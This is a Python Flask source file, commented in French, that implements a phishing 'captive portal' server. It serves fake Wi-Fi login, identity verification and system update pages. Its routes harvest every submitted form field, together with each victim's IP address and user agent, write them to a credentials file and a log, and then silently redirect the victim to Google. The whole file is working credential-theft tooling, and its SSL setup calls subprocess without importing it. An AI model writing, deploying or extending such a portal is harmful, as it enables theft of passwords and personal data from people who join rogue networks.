#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Serveur de portail captif avec Flask
Capture des identifiants et gestion des redirections
"""

import os
import json
import time
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, url_for
from flask_cors import CORS
import ssl
import tempfile

class CaptivePortalServer:
    """Serveur de portail captif avec Flask"""
    
    def __init__(self, template_manager, config, logger):
        self.template_manager = template_manager
        self.config = config
        self.logger = logger
        self.app = Flask(__name__)
        CORS(self.app)
        
        # Stockage des identifiants capturés
        self.captured_credentials = []
        self.credentials_file = '/tmp/captured_credentials.json'
        
        # Configuration SSL
        self.ssl_context = self.setup_ssl()
        
        # Configuration des routes
        self.setup_routes()
        
        # Fichier HTML personnalisé
        self.custom_html_file = None
        self.custom_html_content = None
        
    def setup_routes(self):
        """Configure les routes Flask"""
        
        @self.app.route('/')
        def index():
            """Page principale du portail captif"""
            # Vérification si un fichier HTML personnalisé est configuré
            if self.custom_html_content:
                self.logger.log("INFO", f"Utilisation du fichier HTML personnalisé: {self.custom_html_file}")
                return self.custom_html_content
            
            # Utilisation du template par défaut
            template_id = self.config.get('template_id', 'wifi_login')
            template_content = self.template_manager.get_template(template_id)
            
            # Personnalisation du template
            custom_message = self.config.get('custom_message', 'Veuillez vous connecter pour accéder à Internet')
            template_content = template_content.replace('{{message}}', custom_message)
            
            return template_content
        
        @self.app.route('/login', methods=['POST'])
        def login():
            """Traitement de la connexion"""
            try:
                # Récupération des données du formulaire
                form_data = {}
                for key in request.form:
                    form_data[key] = request.form[key]
                
                # Ajout des métadonnées
                credentials = {
                    'timestamp': datetime.now().isoformat(),
                    'ip_address': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent', ''),
                    'form_data': form_data,
                    'template_used': self.config.get('template_id', 'wifi_login')
                }
                
                # Sauvegarde des identifiants
                self.captured_credentials.append(credentials)
                self.save_credentials()
                
                # Log de la capture
                self.logger.log("INFO", f"Identifiants capturés depuis {request.remote_addr}: {form_data}")
                
                # Redirection après connexion
                redirect_url = self.config.get('redirect_url', 'https://www.google.com')
                return redirect(redirect_url)
                
            except Exception as e:
                self.logger.log("ERROR", f"Erreur lors de la capture des identifiants: {str(e)}")
                return redirect('/')
        
        @self.app.route('/verify', methods=['POST'])
        def verify():
            """Traitement de la vérification d'identité"""
            try:
                # Récupération des données du formulaire
                form_data = {}
                for key in request.form:
                    form_data[key] = request.form[key]
                
                # Ajout des métadonnées
                credentials = {
                    'timestamp': datetime.now().isoformat(),
                    'ip_address': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent', ''),
                    'form_data': form_data,
                    'template_used': self.config.get('template_id', 'verification_required'),
                    'type': 'verification'
                }
                
                # Sauvegarde des identifiants
                self.captured_credentials.append(credentials)
                self.save_credentials()
                
                # Log de la capture
                self.logger.log("INFO", f"Vérification d'identité capturée depuis {request.remote_addr}: {form_data}")
                
                # Redirection après vérification
                redirect_url = self.config.get('redirect_url', 'https://www.google.com')
                return redirect(redirect_url)
                
            except Exception as e:
                self.logger.log("ERROR", f"Erreur lors de la capture de vérification: {str(e)}")
                return redirect('/')
        
        @self.app.route('/update', methods=['POST'])
        def update():
            """Traitement de la mise à jour système"""
            try:
                # Récupération des données du formulaire
                form_data = {}
                for key in request.form:
                    form_data[key] = request.form[key]
                
                # Ajout des métadonnées
                credentials = {
                    'timestamp': datetime.now().isoformat(),
                    'ip_address': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent', ''),
                    'form_data': form_data,
                    'template_used': self.config.get('template_id', 'update_required'),
                    'type': 'system_update'
                }
                
                # Sauvegarde des identifiants
                self.captured_credentials.append(credentials)
                self.save_credentials()
                
                # Log de la capture
                self.logger.log("INFO", f"Identifiants système capturés depuis {request.remote_addr}: {form_data}")
                
                # Redirection après mise à jour
                redirect_url = self.config.get('redirect_url', 'https://www.google.com')
                return redirect(redirect_url)
                
            except Exception as e:
                self.logger.log("ERROR", f"Erreur lors de la capture système: {str(e)}")
                return redirect('/')
    
    def save_credentials(self):
        """Sauvegarde les identifiants capturés"""
        try:
            with open(self.credentials_file, 'w', encoding='utf-8') as f:
                json.dump(self.captured_credentials, f, indent=2, ensure_ascii=False)
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors de la sauvegarde des identifiants: {str(e)}")
    
    def load_credentials(self):
        """Charge les identifiants capturés"""
        try:
            if os.path.exists(self.credentials_file):
                with open(self.credentials_file, 'r', encoding='utf-8') as f:
                    self.captured_credentials = json.load(f)
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors du chargement des identifiants: {str(e)}")
    
    def get_captured_credentials(self):
        """Retourne les identifiants capturés"""
        return self.captured_credentials
    
    def clear_credentials(self):
        """Efface les identifiants capturés"""
        self.captured_credentials = []
        if os.path.exists(self.credentials_file):
            os.remove(self.credentials_file)
    
    def setup_ssl(self):
        """Configure le certificat SSL"""
        try:
            # Génération d'un certificat SSL auto-signé
            cert_file = tempfile.NamedTemporaryFile(delete=False, suffix='.crt')
            key_file = tempfile.NamedTemporaryFile(delete=False, suffix='.key')
            
            # Génération du certificat avec OpenSSL
            subprocess.run([
                'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                '-keyout', key_file.name, '-out', cert_file.name,
                '-days', '365', '-nodes', '-subj', '/CN=localhost'
            ], capture_output=True)
            
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(cert_file.name, key_file.name)
            
            self.logger.log("INFO", "Certificat SSL généré avec succès")
            return ssl_context
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur configuration SSL: {str(e)}")
            return None
    
    def run(self, host='0.0.0.0', port=80, debug=False, use_ssl=False):
        """Démarre le serveur Flask"""
        try:
            if use_ssl and self.ssl_context:
                self.logger.log("INFO", f"Démarrage du serveur HTTPS sur {host}:{port}")
                self.app.run(host=host, port=port, debug=debug, threaded=True, ssl_context=self.ssl_context)
            else:
                self.logger.log("INFO", f"Démarrage du serveur HTTP sur {host}:{port}")
                self.app.run(host=host, port=port, debug=debug, threaded=True)
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors du démarrage du serveur: {str(e)}")
    
    def load_custom_html_file(self, file_path):
        """Charge un fichier HTML personnalisé"""
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    self.custom_html_content = f.read()
                self.custom_html_file = file_path
                self.logger.log("INFO", f"Fichier HTML personnalisé chargé: {file_path}")
                return True
            else:
                self.logger.log("ERROR", f"Fichier HTML introuvable: {file_path}")
                return False
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors du chargement du fichier HTML: {str(e)}")
            return False
    
    def clear_custom_html(self):
        """Efface le fichier HTML personnalisé"""
        self.custom_html_file = None
        self.custom_html_content = None
        self.logger.log("INFO", "Fichier HTML personnalisé effacé")
    
    def get_custom_html_info(self):
        """Retourne les informations sur le fichier HTML personnalisé"""
        return {
            'file_path': self.custom_html_file,
            'is_loaded': self.custom_html_content is not None,
            'content_length': len(self.custom_html_content) if self.custom_html_content else 0
        } 